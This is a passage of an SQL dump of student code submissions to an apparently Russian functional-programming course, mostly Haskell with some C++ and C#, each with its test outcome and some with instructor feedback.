then (x0, y0, c13) else (0,0,0)\n\n		else \n\n			if (z1 && z2)\n\n			then solve2 a b d k l n 1 2\n\n			else if (z1 && z3)\n\n			then solve2 a c d k m n 1 3\n\n			else if (z2 && z3)\n\n			then solve2 b c d l m n 2 3\n\n			else if z1\n\n			then solve1 a d k n 1\n\n			else if z2\n\n			then solve1 b d l n 2\n\n			else if z3\n\n			then solve1 c d m n 3\n\n			else (0,0,0)\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1576, 43, '83813', '2012-10-06 15:50:49', 1, 'euclid 0 a = (0, 1)\r\n\r\n-- pr.x * (b - k*a) + pr.y * a == 1\r\n\r\n-- x * a + y * b == 1\r\n\r\neuclid a b = let { pr = euclid (b `mod` a) a; k = b `div` a } in (snd pr - (k * (fst pr)), fst pr)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1577, 44, '83813', '2012-10-06 15:51:03', 0, 'import Debug.Trace\n\n\n\neuclid 0 a = (0, 1)\n\n-- pr.x * (b - k*a) + pr.y * a == 1\n\n-- x * a + y * b == 1\n\neuclid a b = let { pr = euclid (b `mod` a) a; k = b `div` a } in (snd pr - (k * (fst pr)), fst pr)\n\n\n\n-- ax + by + cz = d\n\n-- kx + ly + mz = n\n\n-- bky + ckz - aly - amz = kd - an\n\ndioph [a,b,c,d] [k,l,m,n] = let \n\n                              x = (b * k) - (a * l)\n\n                              y = (c * k) - (a * m)\n\n                              z = (k * d) - (a * n)\n\n                              sol = euclid x y\n\n                              -- sol.fst * x + sol.snd * y = gcd(x, y)\n\n                              g = (fst sol) * x + ((snd sol) * y)\n\n                              mult = z `div` g\n\n                              realz = snd sol * mult\n\n                              realy = fst sol * mult\n\n                              realx = (d - (c * realz) - (b * realy)) `div` a\n\n                            --in trace ("" ++ show x ++ " " ++ show y ++ " " ++ show z) [realx, realy, realz]\n\n                            in  [realx, realy, realz]\n\n\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,1] [2,2,2,2] in x+y+z", проверьте правильность синтаксиса'),
(1578, 44, '83813', '2012-10-06 15:55:43', 2, 'import Debug.Trace\r\n\r\n\r\n\r\neuclid 0 a = (0, 1)\r\n\r\n-- pr.x * (b - k*a) + pr.y * a == 1\r\n\r\n-- x * a + y * b == 1\r\n\r\neuclid a b = let { pr = euclid (b `mod` a) a; k = b `div` a } in (snd pr - (k * (fst pr)), fst pr)\r\n\r\n\r\n\r\n-- ax + by + cz = d\r\n\r\n-- kx + ly + mz = n\r\n\r\n-- bky + ckz - aly - amz = kd - an\r\n\r\ndioph [a,b,c,d] [k,l,m,n] = let \r\n\r\n                              x = (b * k) - (a * l)\r\n\r\n                              y = (c * k) - (a * m)\r\n\r\n                              z = (k * d) - (a * n)\r\n\r\n                              sol = euclid x y\r\n\r\n                              -- sol.fst * x + sol.snd * y = gcd(x, y)\r\n\r\n                              g = (fst sol) * x + ((snd sol) * y)\r\n\r\n                              mult = if g == 0 then 0 else z `div` g\r\n\r\n                              realz = snd sol * mult\r\n\r\n                              realy = fst sol * mult\r\n\r\n                              realx = if a == 0 then (n - (m * realz) - (l * realy)) `div` k else (d - (c * realz) - (b * realy)) `div` a\r\n\r\n                            --in trace ("" ++ show x ++ " " ++ show y ++ " " ++ show z) [realx, realy, realz]\r\n\r\n                            in  [realx, realy, realz]\r\n\r\n\r\n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [0,0,0,0] [0,1,0,3] in y'),
(1579, 44, '397095', '2012-10-06 16:01:27', 0, 'eu 0 _ = (0, 1)\n\neu a b = \n\n	let \n\n		(x1, y1) = eu (mod b a) a\n\n	in\n\n		(y1 - (div b a) * x1, x1)\n\n\n\n-- (x0, y0, tx, ty)\n\nsolve a b c =\n\n	let \n\n		g = gcd a b\n\n		a1 = div a g\n\n		b1 = div b g\n\n		c1 = div c g\n\n		(u, v) = eu a1 b1\n\n	in\n\n		(u * c1, v * c1, b1, -a1)\n\n\n\nsolve1 a d k n i = \n\n	let\n\n		a1 = div d a\n\n		a2 = div n k\n\n	in\n\n		if\n\n			mod d a == 0 &&\n\n			mod n k == 0 &&\n\n			a1 == a2\n\n		then\n\n			put a1 i\n\n		else\n\n			[0,0,0]\n\nput x i\n\n	| i == 1 = [x,0,0]\n\n	| i == 2 = [0,x,0]\n\n	| otherwise = [0,0,x]\n\n\n\nsolve2 a b d k l n i j = \n\n	if isCollinear (a,b,d) (k,l,n) then\n\n		let\n\n			(x0, y0, _, _) = solve a b d\n\n		in\n\n			put2 x0 y0 i j\n\n	else\n\n		[0,0,0]\n\n\n\nput2 x y i j = merge (put x i) (put y j)\n\n\n\nmerge [x,y,z] [a,b,c] = [if x == 0 then a else x, if y == 0 then b else y , if z == 0 then c else z]\n\n\n\nisCollinear (x,y,z) (a,b,c) =\n\n	let \n\n		sc = x * a + y * b + z * c\n\n		sx = x * x + y * y + z * z\n\n		sy = a * a + b * b + c * c\n\n	in sc * sc == sx * sy\n\n\n\ndioph [a,b,c,d] [k,l,m,n] = \n\n 	let\n\n		c1 = a * m - c * k\n\n		c2 = b * m - c * l\n\n		c3 = d * m - c * n\n\n		g = gcd c1 c2\n\n\n\n		z1 = a /= 0 && k /= 0\n\n		z2 = b /= 0 && l /= 0\n\n		z3 = c /= 0 && m /= 0\n\n	in\n\n		if z1 && z2 && z3 then\n\n			if (mod c3 g) /= 0 then [0,0,0] else\n\n				let\n\n					(x0, y0, tx, ty) = solve c1 c2 c3\n\n					c11 = a * tx + b * ty -- t\n\n					c13 = d - a * x0 - b * y0\n\n					c21 = k * tx +l * ty -- t\n\n					c23 = n - k * x0 - l * y0\n\n				in\n\n					if isCollinear (c11, c, c13) (c21, m, c23) then [x0, y0, c13] else [0,0,0]\n\n		else \n\n			if (z1 && z2)\n\n			then solve2 a b d k l n 1 2\n\n			else if (z1 && z3)\n\n			then solve2 a c d k m n 1 3\n\n			else if (z2 && z3)\n\n			then solve2 b c d l m n 2 3\n\n			else if z1\n\n			then solve1 a d k n 1\n\n			else if z2\n\n			then solve1 b d l n 2\n\n			else if z3\n\n			then solve1 c d m n 3\n\n			else [0,0,0]\n\n\n\n--main = print (dioph [1,1,1,6] [1,2,3,14])\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,1] [2,2,2,2] in x+y+z", проверьте правильность синтаксиса'),
(1580, 44, '397095', '2012-10-06 16:04:23', 0, 'eu 0 _ = (0, 1)\n\neu a b = \n\n	let \n\n		(x1, y1) = eu (mod b a) a\n\n	in\n\n		(y1 - (div b a) * x1, x1)\n\n\n\n-- (x0, y0, tx, ty)\n\nsolve a b c =\n\n	let \n\n		g = gcd a b\n\n		a1 = div a g\n\n		b1 = div b g\n\n		c1 = div c g\n\n		(u, v) = eu a1 b1\n\n	in\n\n		(u * c1, v * c1, b1, -a1)\n\n\n\nsolve1 a d k n i = \n\n	let\n\n		a1 = div d a\n\n		a2 = div n k\n\n	in\n\n		if\n\n			mod d a == 0 &&\n\n			mod n k == 0 &&\n\n			a1 == a2\n\n		then\n\n			put a1 i\n\n		else\n\n			[0,0,0]\n\nput x i\n\n	| i == 1 = [x,0,0]\n\n	| i == 2 = [0,x,0]\n\n	| otherwise = [0,0,x]\n\n\n\nsolve2 a b d k l n i j = \n\n	if isCollinear (a,b,d) (k,l,n) then\n\n		let\n\n			(x0, y0, _, _) = solve a b d\n\n		in\n\n			put2 x0 y0 i j\n\n	else\n\n		[0,0,0]\n\n\n\nput2 x y i j = merge (put x i) (put y j)\n\n\n\nmerge [x,y,z] [a,b,c] = [if x == 0 then a else x, if y == 0 then b else y , if z == 0 then c else z]\n\n\n\nisCollinear (x,y,z) (a,b,c) =\n\n	let \n\n		sc = x * a + y * b + z * c\n\n		sx = x * x + y * y + z * z\n\n		sy = a * a + b * b + c * c\n\n	in sc * sc == sx * sy\n\n\n\ndioph [a,b,c,d] [k,l,m,n] =\n\n	if\n\n		isCollinear (a,b,c) (k,l,m) &&\n\n		isCollinear (b,c,d) (l,m,n)\n\n	then\n\n		let \n\n			(x, y, _, _) = solve a b d\n\n		in\n\n			[x, y, 0]\n\n	else\n\n	 	let\n\n			c1 = a * m - c * k\n\n			c2 = b * m - c * l\n\n			c3 = d * m - c * n\n\n			g = gcd c1 c2\n\n\n\n			z1 = a /= 0 && k /= 0\n\n			z2 = b /= 0 && l /= 0\n\n			z3 = c /= 0 && m /= 0\n\n		in\n\n			if z1 && z2 && z3 then\n\n				if (mod c3 g) /= 0 then [0,0,0] else\n\n					let\n\n						(x0, y0, tx, ty) = solve c1 c2 c3\n\n						c11 = a * tx + b * ty -- t\n\n						c13 = d - a * x0 - b * y0\n\n						c21 = k * tx +l * ty -- t\n\n						c23 = n - k * x0 - l * y0\n\n					in\n\n						if isCollinear (c11, c, c13) (c21, m, c23) then [x0, y0, c13] else [0,0,0]\n\n			else \n\n				if (z1 && z2)\n\n				then solve2 a b d k l n 1 2\n\n				else if (z1 && z3)\n\n				then solve2 a c d k m n 1 3\n\n				else if (z2 && z3)\n\n				then solve2 b c d l m n 2 3\n\n				else if z1\n\n				then solve1 a d k n 1\n\n				else if z2\n\n				then solve1 b d l n 2\n\n				else if z3\n\n				then solve1 c d m n 3\n\n				else [0,0,0]\n\n\n\n--main = print (dioph [1,1,1,1] [2,2,2,2])\n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [1,0,1,2] [0,1,0,0] in (x+z, y)'),
(1581, 44, '397095', '2012-10-06 16:17:42', 2, 'eu 0 _ = (0, 1)\r\n\r\neu a b = \r\n\r\n	let \r\n\r\n		(x1, y1) = eu (mod b a) a\r\n\r\n	in\r\n\r\n		(y1 - (div b a) * x1, x1)\r\n\r\n\r\n\r\n-- (x0, y0, tx, ty)\r\n\r\nsolve a b c =\r\n\r\n	let \r\n\r\n		g = gcd a b\r\n\r\n		a1 = div a g\r\n\r\n		b1 = div b g\r\n\r\n		c1 = div c g\r\n\r\n		(u, v) = eu a1 b1\r\n\r\n	in\r\n\r\n		(u * c1, v * c1, b1, -a1)\r\n\r\n\r\n\r\nsolve1 a d k n i = \r\n\r\n	let\r\n\r\n		a1 = if a == 0 then 0 else div d a\r\n\r\n		a2 = if k == 0 then 0 else div n k\r\n\r\n	in\r\n\r\n		if\r\n\r\n			if a == 0 then True else mod d a == 0 &&\r\n\r\n			if k == 0 then True else mod n k == 0 &&\r\n\r\n			a1 == a2\r\n\r\n		then\r\n\r\n			put a1 i\r\n\r\n		else\r\n\r\n			[0,0,0]\r\n\r\nput x i\r\n\r\n	| i == 1 = [x,0,0]\r\n\r\n	| i == 2 = [0,x,0]\r\n\r\n	| otherwise = [0,0,x]\r\n\r\n\r\n\r\nsolve2 a b d k l n i j = \r\n\r\n	if isCollinear (a,b,d) (k,l,n) then\r\n\r\n		let\r\n\r\n			(x0, y0, _, _) = \r\n\r\n				if (a == 0 && b == 0 && d == 0) \r\n\r\n				then solve k l n\r\n\r\n				else solve a b d\r\n\r\n		in\r\n\r\n			put2 x0 y0 i j\r\n\r\n	else\r\n\r\n		[0,0,0]\r\n\r\n\r\n\r\nput2 x y i j = merge (put x i) (put y j)\r\n\r\n\r\n\r\nmerge [x,y,z] [a,b,c] = [if x == 0 then a else x, if y == 0 then b else y , if z == 0 then c else z]\r\n\r\n\r\n\r\nisCollinear (x,y,z) (a,b,c) =\r\n\r\n	let \r\n\r\n		sc = x * a + y * b + z * c\r\n\r\n		sx = x * x + y * y + z * z\r\n\r\n		sy = a * a + b * b + c * c\r\n\r\n	in sc * sc == sx * sy\r\n\r\n\r\n\r\ndioph [a,b,c,d] [k,l,m,n] =\r\n\r\n	if\r\n\r\n		isCollinear (a,b,c) (k,l,m) &&\r\n\r\n		isCollinear (b,c,d) (l,m,n)\r\n\r\n	then\r\n\r\n		let \r\n\r\n			(x, y, _, _) = solve a b d\r\n\r\n		in\r\n\r\n			[x, y, 0]\r\n\r\n	else\r\n\r\n	 	let\r\n\r\n			c1 = a * m - c * k\r\n\r\n			c2 = b * m - c * l\r\n\r\n			c3 = d * m - c * n\r\n\r\n			g = gcd c1 c2\r\n\r\n\r\n\r\n			z1 = a /= 0 && k /= 0\r\n\r\n			z2 = b /= 0 && l /= 0\r\n\r\n			z3 = c /= 0 && m /= 0\r\n\r\n\r\n\r\n			zz1 = a /= 0 && b /= 0 || k /= 0 && l /= 0\r\n\r\n			zz2 = b /= 0 && c /= 0 || l /= 0 && m /= 0\r\n\r\n			zz3 = a /= 0 && c /= 0 || k /= 0 && m /= 0\r\n\r\n		in\r\n\r\n			if z1 && z2 && z3 then\r\n\r\n				if (mod c3 g) /= 0 then [0,0,0] else\r\n\r\n					let\r\n\r\n						(x0, y0, tx, ty) = solve c1 c2 c3\r\n\r\n						c11 = a * tx + b * ty -- t\r\n\r\n						c13 = d - a * x0 - b * y0\r\n\r\n						c21 = k * tx +l * ty -- t\r\n\r\n						c23 = n - k * x0 - l * y0\r\n\r\n					in\r\n\r\n						if isCollinear (c11, c, c13) (c21, m, c23) then [x0, y0, c13] else [0,0,0]\r\n\r\n			else \r\n\r\n				if (z1 && z2)\r\n\r\n				then solve2 a b d k l n 1 2\r\n\r\n				else if (z1 && z3)\r\n\r\n				then solve2 a c d k m n 1 3\r\n\r\n				else if (z2 && z3)\r\n\r\n				then solve2 b c d l m n 2 3\r\n\r\n				else if z1\r\n\r\n				then solve1 a d k n 1\r\n\r\n				else if z2\r\n\r\n				then solve1 b d l n 2\r\n\r\n				else if z3\r\n\r\n				then solve1 c d m n 3\r\n\r\n				else if zz1\r\n\r\n				then merge (solve1 c d m n 3) (solve2 a b d k l n 1 2)\r\n\r\n				else if zz2\r\n\r\n				then merge (solve1 b d l n 3) (solve2 a c d k m n 1 3)\r\n\r\n				else if zz3\r\n\r\n				then merge (solve1 a d k n 3) (solve2 b c d l m n 2 3)\r\n\r\n				else [0,0,0]\r\n\r\n\r\n\r\n--main = print (dioph [1,0,1,2] [0,1,0,0])\r\n\r\n--main = print (dioph [1,1,1,1] [2,2,2,2])\r\n\r\n--main = print (dioph [1,1,1,6] [1,2,3,14])\r\n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [25,33,0,1] [1,0,1,0] in (25*x+33*y, x+z)'),
(1582, 46, '51559263', '2012-10-06 16:47:28', 1, '#include <iostream>\r\n#include <algorithm>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nbool IsEven ( int x )\r\n{\r\n	return x % 2 == 0 ;\r\n}\r\n\r\nbool ContainsEven ( const vector<int> const & v )\r\n{\r\n	return find_if( v.begin(), v.end(), IsEven ) != v.end();\r\n          --- OK, но я бы IsEven не описывал, а прямо тут описал бы лямбда-выражение\r\n          --- (Это вообще-то ничем не лучше, просто мб немного эффекстнее)) \r\n}\r\n\r\nint main( )\r\n{\r\n	vector<int> v;\r\n\r\n	v.push_back(1);\r\n	v.push_back(2);\r\n	v.push_back(3);\r\n	v.push_back(4);\r\n\r\n	char c;\r\n\r\n	cout << ( ContainsEven( v ) ? "True" : "False" ) << endl;\r\n	cin >> c;\r\n\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1583, 54, '3431532', '2012-10-06 18:45:20', 1, 'data Scheme = Scheme Scheme Scheme Int | Node Float\r\n\r\ntotalResistance (Node x) = x\r\ntotalResistance (Scheme x1 x2 0) = totalResistance x1 + totalResistance x2\r\ntotalResistance (Scheme x1 x2 1) = let x = totalResistance x1\r\n				       y = totalResistance x2\r\n					in x*y/(x+y)\r\n\r\n\r\n-- тип соединения хранится в Int''овом флажке 0 - последовательно, 1 - параллельно\r\n   --- OK, но тогда, наверное, логичнее не Int, а Bool\r\n				           \r\n', '<br/>Тесты успешно пройдены!'),
(1584, 51, '63706456', '2012-10-06 19:10:45', 0, 'repeatFunc f 1 = f\r\nrepeatFunc f n = f $ repeatFunc f $ n-1', 'Не удалось вычислить выражение "(repeatFunc (*2) 3) 1", проверьте правильность синтаксиса'),
(1585, 51, '63706456', '2012-10-06 19:10:55', 0, 'repeatFunc f 1 = f\r\nrepeatFunc f n = f $ repeatFunc f (n-1)', 'Не удалось вычислить выражение "(repeatFunc (*2) 3) 1", проверьте правильность синтаксиса'),
(1586, 51, '63706456', '2012-10-06 19:11:24', 1, 'repeatFunc f 1 = f\r\nrepeatFunc f n = f . repeatFunc f (n-1)', '<br/>Тесты успешно пройдены!'),
(1587, 52, '63706456', '2012-10-06 19:16:22', 1, 'repeatFunc f n = foldr (x y-> f.y ) id [1..n]', '<br/>Тесты успешно пройдены!'),
(1588, 53, '63706456', '2012-10-06 20:01:16', 1, 'coins n = [[x,y,z]| x <- [0..n], y <- [0..n], z <- [0..n], x*2 + y*3 + z*5 == n]', '<br/>Тесты успешно пройдены!'),
(1589, 43, '472848', '2012-10-06 20:42:51', 0, 'euclid a b = if (a > b) \r\nthen f a b 0 1 1 0\r\nelse f a b 1 0 0 1\r\n\r\nf a 1 x y _ _ = (x, y)\r\nf 1 b x y _ _ = (x, y)\r\nf 0 b _ _ _ _ = (0, 0)\r\nf a 0 _ _ _ _ = (0, 0)\r\nf a b x y xp yp = if (a > b) \r\nthen f (mod a b) b (xp - x * div a b) (yp - y * div a b) x y\r\nelse f a (mod b a) (xp - x * div b a) (yp - y * div b a) x y', 'Выражение имеет неправильное значение: let (x,y) = euclid 1 0 in 1*x+0*y'),
(1590, 43, '472848', '2012-10-06 20:47:03', 1, 'euclid a b = if (a > b) \r\nthen f a b 0 1 1 0\r\nelse f a b 1 0 0 1\r\n\r\nf 0 b _ _ xp yp = (xp, yp)\r\nf a 0 _ _ xp yp = (xp, yp)\r\nf a b x y xp yp = if (a > b) \r\nthen f (mod a b) b (xp - x * div a b) (yp - y * div a b) x y\r\nelse f a (mod b a) (xp - x * div b a) (yp - y * div b a) x y\r\n   --- OK, но, на самом деле, можно оба раза не проверять, что a < b\r\n   --- Если у вас например a < b и вы будете действовать, как будто a > b,\r\n   --- то ваш алгоритм, как не странно, тоже сработает\r\n', '<br/>Тесты успешно пройдены!'),
(1591, 51, 'tonyo', '2012-10-06 20:59:43', 1, 'repeatFunc f n x = foldr (y res -> f res) x [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1592, 52, 'tonyo', '2012-10-06 21:00:24', 1, 'repeatFunc f n x = foldr (y res -> f res) x [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1593, 53, 'tonyo', '2012-10-06 21:06:56', 1, 'coins n = [ [x,y,z] | let mx = div n 2, let my = div n 3, let mz = div n 5,  \r\n                            x <- [0..mx], y <- [0..my], z <- [0..mz], x*2 + y*3 + z*5 == n ] ', '<br/>Тесты успешно пройдены!'),
(1594, 47, '472848', '2012-10-06 21:15:50', 0, 'powerset s = [] : f s\r\n\r\nf [x] = [[x]]\r\nf (x:xs) = [x] : foldr (ys r -> ys:(x:ys):r) [] (f xs)', 'Не удалось вычислить выражение "powerset []", проверьте правильность синтаксиса'),
(1595, 47, '472848', '2012-10-06 21:16:24', 1, 'powerset s = [] : f s\r\n\r\nf [] = []\r\nf (x:xs) = [x] : foldr (ys r -> ys:(x:ys):r) [] (f xs)', '<br/>Тесты успешно пройдены!'),
(1596, 51, '472848', '2012-10-06 21:21:35', 1, 'repeatFunc f 1 = f\r\nrepeatFunc f n = f.(repeatFunc f (n-1))', '<br/>Тесты успешно пройдены!'),
(1597, 52, '472848', '2012-10-06 21:33:37', 1, 'repeatFunc f n = foldl (x y -> x.y) id (map (x -> f) [1..n])', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1598, 48, '17107004', '2012-10-06 21:39:02', 1, '\r\nlambda = ( x y -> (z -> (y (x:z))))\r\n\r\n\r\n\r\nmyreverse lst = (foldr lambda id lst) []\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1599, 47, '51559263', '2012-10-06 21:45:08', 1, 'pS [x] = [[x]]\r\n\r\npS ( x : xs ) = let previousPS = pS xs\r\n\r\n                in [x] : ( previousPS ++ ( map ( y -> x : y ) ( previousPS ) ) ) \r\n\r\n\r\n\r\npowerset [] = [[]]\r\n\r\npowerset xs = [] : ( pS xs )\r\n', '<br/>Тесты успешно пройдены!'),
(1600, 54, '472848', '2012-10-06 21:48:38', 1, 'data Scheme = Resist Double | Parall Scheme Scheme | Sequent Scheme Scheme\r\n\r\ntotalResistance sch = r sch\r\n\r\nr (Sequent sch0 sch1) = r sch0 + r sch1\r\nr (Parall sch0 sch1) = (r sch0 * r sch1)/(r sch0 + r sch1)\r\nr (Resist val) = val', '<br/>Тесты успешно пройдены!'),
(1601, 43, 'tonyo', '2012-10-06 21:57:26', 1, 'swap (a,b) = (b,a)\r\n\r\ndivide a b \r\n    | a < b = swap $ divide b a \r\n    | otherwise = (q, r)\r\n        where q = div a b; r = a - b * q                                                                                                                                                        \r\n\r\neuclid a b \r\n    | a < b = swap $ euclid b a \r\n    | b == 0 = (1, 0)\r\n    | otherwise = (t, s-q*t)\r\n        where (q,r) = divide a b; (s,t) = euclid b r \r\n', '<br/>Тесты успешно пройдены!'),
(1602, 53, '472848', '2012-10-06 22:09:40', 1, 'coins n = [[i,j,k]|i<-[0..div n 2], j<-[0..div n 3], k<-[0..div n 5], 2*i + 3*j + 5*k == n]', '<br/>Тесты успешно пройдены!'),
(1603, 51, 'erwert', '2012-10-07 03:08:42', 1, 'repeatFunc f n = rf f f (n-1)\r\n\r\nrf f g 0 = f\r\nrf f g n = rf (f.g) g (n-1)\r\n', '<br/>Тесты успешно пройдены!'),
(1604, 52, 'erwert', '2012-10-07 03:08:56', 1, 'repeatFunc f n = foldl1 (.) [f | t <- [1..n]]\r\n', '<br/>Тесты успешно пройдены!'),
(1605, 53, 'erwert', '2012-10-07 03:25:50', 1, 'coins n = [ [a,b,c] | a <- [0..(div n 2)], b <- [0..(div n 3)], c <- [0..(div n 5)], 2*a+3*b+5*c == n ]\r\n', '<br/>Тесты успешно пройдены!'),
(1606, 45, '442421', '2012-10-07 04:27:01', 0, 'static bool HasIvenInAll(IEnumerable<IEnumerable<int>> param)\r\n        {\r\n            return param.All(x =>\r\n                x.Any(y =>\r\n                    y % 2 == 0)\r\n                );\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int[][] a=new int [3][];\r\n\r\n            a[0] = new int[3] { 1, 7, 3 };\r\n            a[1] = new int[4] { 1, 5, 3, 5 };\r\n            a[2] = new int[2] { 1, 9 };\r\n            Console.WriteLine(HasIvenInAll(a));\r\n\r\n            a[0] = new int[3] { 1, 3, 3 };\r\n            a[1] = new int[4] { 1, 5, 3, 7 };\r\n            a[2] = new int[2] { 1, 4 };\r\n            Console.WriteLine(HasIvenInAll(a));\r\n\r\n            a[0] = new int[3] { 1, 2, 3 };\r\n            a[1] = new int[4] { 1, 2, 3, 4 };\r\n            a[2] = new int[2] { 1, 2 };\r\n            Console.WriteLine(HasIvenInAll(a));\r\n\r\n            a[0] = new int[3] { 1, 8, 3 };\r\n            a[1] = new int[4] { 1, 5, 8, 5 };\r\n            a[2] = new int[2] { 1, 6 };\r\n            Console.WriteLine(HasIvenInAll(a));\r\n\r\n      ', '<br/>Тесты успешно пройдены!'),
(1607, 45, '442421', '2012-10-07 04:30:42', 1, '/*\r\n * По всей видимости длинный текст решения\r\n * обрезается системой тестирования, либо \r\n * неправильно отображается.\r\n*/\r\nstatic bool HasIvenInAll(IEnumerable<IEnumerable<int>> param)\r\n        {\r\n            return param.All(x =>\r\n                x.Any(y =>\r\n                    y % 2 == 0)\r\n                );\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int[][] a=new int [3][];\r\n\r\n            a[0] = new int[3] { 1, 7, 3 };\r\n            a[1] = new int[4] { 1, 5, 3, 5 };\r\n            a[2] = new int[2] { 1, 9 };\r\n            Console.WriteLine(HasIvenInAll(a));\r\n\r\n\r\n            Console.ReadKey();\r\n        }', '<br/>Тесты успешно пройдены!'),
(1608, 46, '442421', '2012-10-07 05:13:00', 0, '\r\n#include <vector>\r\n#include <algorithm>\r\n\r\n#include <iostream>\r\n#include <conio.h>\r\n\r\nusing namespace std;\r\n\r\nbool HasEven(const vector<int> vec)\r\n{\r\n	auto end = vec.end();\r\n	auto t =  find_if(vec.begin(), vec.end(), [] (int _n)\r\n        {\r\n            return (_n % 2) == 0;\r\n        });\r\n	return t!=vec.end();\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	vector<int> v = vector<int> ();\r\n	v.push_back(1);\r\n	//v.push_back(2);\r\n	v.push_back(3);\r\n	//v.push_back(4);\r\n\r\n	cout<<HasEven(v);\r\n	getchar();\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1609, 46, '442421', '2012-10-07 05:13:51', 0, '#include <vector>\r\n#include <algorithm>\r\n\r\n#include <iostream>\r\n#include <conio.h>\r\n\r\nusing namespace std;\r\n\r\nbool HasEven(const vector<int> vec)\r\n{\r\n	auto end = vec.end();\r\n	auto t =  find_if(vec.begin(), end, [] (int _n)\r\n        {\r\n            return (_n % 2) == 0;\r\n        });\r\n	return t!=vec.end();\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	vector<int> v = vector<int> ();\r\n	v.push_back(1);\r\n	//v.push_back(2);\r\n	v.push_back(3);\r\n	//v.push_back(4);\r\n\r\n	cout<<HasEven(v);\r\n	getchar();\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1610, 46, '442421', '2012-10-07 05:14:43', 1, '#include "stdafx.h"\r\n\r\n#include <vector>\r\n#include <algorithm>\r\n\r\n#include <iostream>\r\n#include <conio.h>\r\n\r\nusing namespace std;\r\n\r\nbool HasEven(const vector<int> vec)\r\n{\r\n	auto end = vec.end();\r\n	auto t =  find_if(vec.begin(), end, [] (int _n)\r\n        {\r\n            return (_n % 2) == 0;\r\n        });\r\n	return t!=end;\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	vector<int> v = vector<int> ();\r\n	v.push_back(1);\r\n	//v.push_back(2);\r\n	v.push_back(3);\r\n	//v.push_back(4);\r\n\r\n	cout<<HasEven(v);\r\n	getchar();\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1611, 56, '63706456', '2012-10-07 07:05:36', 1, 'allLists n 0 = [[]]\r\nallLists n len = [(x:xs)|x <- [1..n], xs <- allLists n (len-1)]', '<br/>Тесты успешно пройдены!'),
(1612, 56, 'Deutsche', '2012-10-07 08:04:31', 1, 'import Data.List\r\ncopy s s1 0 = s\r\ncopy s s1 k = copy (s1 ++ s) s1 (k-1)\r\nallLists n k = [s | s <- nub (subsequences (copy [] [1..n] k)), length s == k]\r\n   --- OK, но, честно сказать, это не самое эффективное решение) Ну ладно, засчитано, и эту задачу мы потом разберем', '<br/>Тесты успешно пройдены!'),
(1613, 56, '3431532', '2012-10-07 08:47:36', 1, 'allLists _  0 = [[]]\r\nallLists r n = [(x:xs) | x <- [1..r], xs <- allLists r (n-1)]', '<br/>Тесты успешно пройдены!'),
(1614, 43, '442421', '2012-10-07 09:13:53', 1, 'euclid 1 0 = (1,0)\r\neuclid 0 1 = (0,1)\r\neuclid a b = if gcd a b > 1 \r\n	     then \r\n		(0,0)\r\n	     else\r\n		if b > a \r\n		then \r\n		   rev (euclid'' (nod'' b a))\r\n		else\r\n		   euclid'' (nod'' a b)\r\n\r\neuclid'' (p:ps) = euclid'''' (p:ps) 1 (1-(fst p))\r\n\r\neuclid'''' [] x y = (x,y)\r\neuclid'''' (p:ps) x y= euclid'''' ps y (div (1-(fst p)*y) (snd p))\r\n\r\nnod'' a b = tail(reverse (nod'''' a b [] ))\r\n\r\nnod'''' b 0 x = x ++ [(b,0)]\r\nnod'''' a b x = nod'''' b (mod a b) (x ++ [(a,b)])\r\n\r\nrev (x,y) = (y,x)', '<br/>Тесты успешно пройдены!'),
(1615, 43, '1029771', '2012-10-07 10:21:07', 0, 'euclid 0 a = error " не взаимнопростые"\r\neuclid a 0 = error " не взаимнопростые"\r\neuclid a 1 = ( 0 , 1 )\r\neuclid 1 a = ( 1 , 0 )\r\neuclid a b = ( x - y * d , y - x * c ) where c = quot a b; d = quot b a; ( x , y ) = euclid a-b*c b-a*d', 'Не удалось вычислить выражение "let (x,y) = euclid 3 5 in 3*x+5*y", проверьте правильность синтаксиса'),
(1616, 43, '1029771', '2012-10-07 10:21:49', 2, 'euclid 0 a = error " не взаимнопростые"\r\neuclid a 0 = error " не взаимнопростые"\r\neuclid a 1 = ( 0 , 1 )\r\neuclid 1 a = ( 1 , 0 )\r\neuclid a b = ( x - y * d , y - x * c ) where c = quot a b; d = quot b a; ( x , y ) = euclid a-b*c b-a*d\r\n   --- Так а у вас компилируется программа? У меня нет. Вообще идея совершенно правильная, но,\r\n   --- пожалуйста, сделайте, чтобы программа компилировалась  ', 'Не удалось вычислить выражение "let (x,y) = euclid 3 5 in 3*x+5*y", проверьте правильность синтаксиса'),
(1617, 56, '12206137', '2012-10-07 10:35:38', 1, 'allLists n 0 = [[]]\r\n\r\nallLists n k =\r\n\r\n    let tails = allLists n (k-1) in\r\n\r\n    [y | i <- [1..n], y <- map (x -> i:x) tails]\r\n  --- Ну или можно [i:xs| i <-[1..n], xs<-allLists и т.д.\r\n\r\n', '<br/>Тесты успешно пройдены!'),
